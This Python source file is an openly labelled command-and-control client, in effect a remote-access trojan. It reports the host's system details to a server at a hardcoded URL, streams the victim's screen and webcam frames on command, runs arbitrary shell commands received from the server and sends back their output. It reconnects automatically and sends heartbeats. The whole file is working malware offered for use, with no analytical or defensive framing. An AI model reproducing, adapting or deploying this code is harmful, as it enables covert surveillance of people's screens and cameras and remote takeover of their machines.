#!/usr/bin/env python3
"""
C2 Client - Real-Time Screen & Camera Sharing
Windows/Linux Version
"""

import socketio
import platform
import getpass
import subprocess
import threading
import time
import os
import base64
import json
import cv2
import numpy as np
from PIL import ImageGrab
import mss
import sys
import io

class C2Client:
    def __init__(self, server_url):
        self.server_url = server_url
        self.sio = socketio.Client()
        self.client_id = None
        self.connected = False
        
        # System info
        self.hostname = platform.node()
        self.username = getpass.getuser()
        self.os = platform.system() + " " + platform.release()
        self.platform = platform.platform()
        
        # Stream control
        self.screen_stream_active = False
        self.camera_stream_active = False
        self.stream_quality = 'medium'
        self.stream_fps = 15
        self.camera_id = 0
        
        # Camera
        self.camera = None
        self.camera_indexes = self.find_cameras()
        
        self.setup_handlers()
    
    def find_cameras(self):
        """Find available cameras"""
        indexes = []
        for i in range(5):  # Check first 5 cameras
            cap = cv2.VideoCapture(i)
            if cap.read()[0]:
                indexes.append(i)
                cap.release()
        return indexes
    
    def setup_handlers(self):
        @self.sio.on('connect')
        def on_connect():
            print(f"[+] Connected to server: {self.server_url}")
            self.connected = True
            self.register()
        
        @self.sio.on('disconnect')
        def on_disconnect():
            print("[-] Disconnected from server")
            self.connected = False
            self.stop_all_streams()
        
        @self.sio.on('welcome')
        def on_welcome(data):
            self.client_id = data['client_id']
            print(f"[*] Registered as: {self.client_id}")
        
        @self.sio.on('command')
        def on_command(data):
            self.handle_command(data)
        
        @self.sio.on('heartbeat_ack')
        def on_heartbeat_ack(data):
            pass
    
    def register(self):
        """Register with server"""
        capabilities = ['screen', 'camera', 'shell']
        if self.camera_indexes:
            capabilities.append('camera')
        
        self.sio.emit('register', {
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os,
            'platform': self.platform,
            'device_type': 'desktop',
            'capabilities': capabilities
        })
    
    def handle_command(self, data):
        """Handle command from server"""
        cmd_type = data.get('type', 'shell')
        
        if cmd_type == 'start_screen_stream':
            self.start_screen_stream(data)
        elif cmd_type == 'stop_screen_stream':
            self.stop_screen_stream()
        elif cmd_type == 'start_camera_stream':
            self.start_camera_stream(data)
        elif cmd_type == 'stop_camera_stream':
            self.stop_camera_stream()
        elif cmd_type == 'update_stream_settings':
            self.update_stream_settings(data)
        else:
            self.execute_shell_command(data)
    
    def start_screen_stream(self, data):
        """Start screen streaming"""
        self.screen_stream_active = True
        self.stream_quality = data.get('quality', 'medium')
        self.stream_fps = data.get('fps', 15)
        
        print(f"[🎬] Starting screen stream (Quality: {self.stream_quality}, FPS: {self.stream_fps})")
        threading.Thread(target=self.screen_stream_thread, daemon=True).start()
    
    def stop_screen_stream(self):
        """Stop screen streaming"""
        self.screen_stream_active = False
        print("[🎬] Screen stream stopped")
    
    def start_camera_stream(self, data):
        """Start camera streaming"""
        self.camera_stream_active = True
        self.camera_id = data.get('camera_id', 0)
        self.stream_quality = data.get('quality', 'medium')
        self.stream_fps = data.get('fps', 15)
        
        print(f"[📷] Starting camera {self.camera_id} stream")
        threading.Thread(target=self.camera_stream_thread, daemon=True).start()
    
    def stop_camera_stream(self):
        """Stop camera streaming"""
        self.camera_stream_active = False
        if self.camera is not None:
            self.camera.release()
            self.camera = None
        print("[📷] Camera stream stopped")
    
    def update_stream_settings(self, data):
        """Update stream settings"""
        if data.get('quality'):
            self.stream_quality = data['quality']
        if data.get('fps'):
            self.stream_fps = data['fps']
        print(f"[⚙️] Stream settings updated: Quality={self.stream_quality}, FPS={self.stream_fps}")
    
    def screen_stream_thread(self):
        """Screen streaming thread"""
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            
            while self.screen_stream_active and self.connected:
                try:
                    # Capture screen
                    screenshot = sct.grab(monitor)
                    
                    # Convert to numpy array
                    img = np.array(screenshot)
                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    
                    # Resize based on quality
                    height, width = img.shape[:2]
                    if self.stream_quality == 'low':
                        new_width = width // 4
                    elif self.stream_quality == 'medium':
                        new_width = width // 2
                    else:  # high
                        new_width = width
                    
                    new_height = int(new_width * height / width)
                    img = cv2.resize(img, (new_width, new_height))
                    
                    # Encode as JPEG
                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 85]
                    _, buffer = cv2.imencode('.jpg', img, encode_param)
                    frame_data = base64.b64encode(buffer).decode('utf-8')
                    
                    # Send frame
                    self.sio.emit('screen_frame', {
                        'client_id': self.client_id,
                        'frame': frame_data,
                        'quality': self.stream_quality,
                        'timestamp': time.time()
                    })
                    
                    # Control FPS
                    time.sleep(1.0 / self.stream_fps)
                    
                except Exception as e:
                    print(f"[!] Screen capture error: {e}")
                    time.sleep(1)
    
    def camera_stream_thread(self):
        """Camera streaming thread"""
        self.camera = cv2.VideoCapture(self.camera_id)
        
        while self.camera_stream_active and self.connected:
            try:
                ret, frame = self.camera.read()
                if not ret:
                    print(f"[!] Camera {self.camera_id} read failed")
                    time.sleep(1)
                    continue
                
                # Resize based on quality
                height, width = frame.shape[:2]
                if self.stream_quality == 'low':
                    new_width = 320
                elif self.stream_quality == 'medium':
                    new_width = 640
                else:  # high
                    new_width = 1280
                
                new_height = int(new_width * height / width)
                frame = cv2.resize(frame, (new_width, new_height))
                
                # Encode as JPEG
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
                _, buffer = cv2.imencode('.jpg', frame, encode_param)
                frame_data = base64.b64encode(buffer).decode('utf-8')
                
                # Send frame
                self.sio.emit('camera_frame', {
                    'client_id': self.client_id,
                    'frame': frame_data,
                    'camera_id': self.camera_id,
                    'quality': self.stream_quality,
                    'timestamp': time.time()
                })
                
                # Control FPS
                time.sleep(1.0 / self.stream_fps)
                
            except Exception as e:
                print(f"[!] Camera stream error: {e}")
                time.sleep(1)
        
        if self.camera is not None:
            self.camera.release()
            self.camera = None
    
    def execute_shell_command(self, data):
        """Execute shell command"""
        cmd_id = data['id']
        command = data.get('command', '')
        
        try:
            if platform.system() == "Windows":
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            
            output = result.stdout
            if result.stderr:
                output += "\nERROR:\n" + result.stderr
            
            self.sio.emit('result', {
                'command_id': cmd_id,
                'client_id': self.client_id,
                'command': command,
                'output': output,
                'success': result.returncode == 0
            })
            
        except subprocess.TimeoutExpired:
            self.sio.emit('result', {
                'command_id': cmd_id,
                'client_id': self.client_id,
                'command': command,
                'output': "Command timed out after 30 seconds",
                'success': False
            })
        except Exception as e:
            self.sio.emit('result', {
                'command_id': cmd_id,
                'client_id': self.client_id,
                'command': command,
                'output': f"Error: {str(e)}",
                'success': False
            })
    
    def stop_all_streams(self):
        """Stop all active streams"""
        self.screen_stream_active = False
        self.camera_stream_active = False
        if self.camera is not None:
            self.camera.release()
            self.camera = None
    
    def heartbeat(self):
        """Send periodic heartbeat"""
        while True:
            if self.connected and self.client_id:
                self.sio.emit('heartbeat', {
                    'client_id': self.client_id,
                    'timestamp': time.time()
                })
            time.sleep(30)
    
    def connect(self):
        """Connect to server"""
        try:
            self.sio.connect(self.server_url)
            
            # Start heartbeat thread
            threading.Thread(target=self.heartbeat, daemon=True).start()
            
            # Keep connection alive
            self.sio.wait()
            
        except Exception as e:
            print(f"[-] Connection error: {e}")
            time.sleep(5)
            self.connect()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        server_url = sys.argv[1]
    else:
        server_url = "https://c2-server-io.onrender.com"  # Change to your server URL
    
    # Install required packages
    required = ['opencv-python', 'mss', 'pillow', 'python-socketio']
    print("[*] Checking dependencies...")
    
    client = C2Client(server_url)
    client.connect()
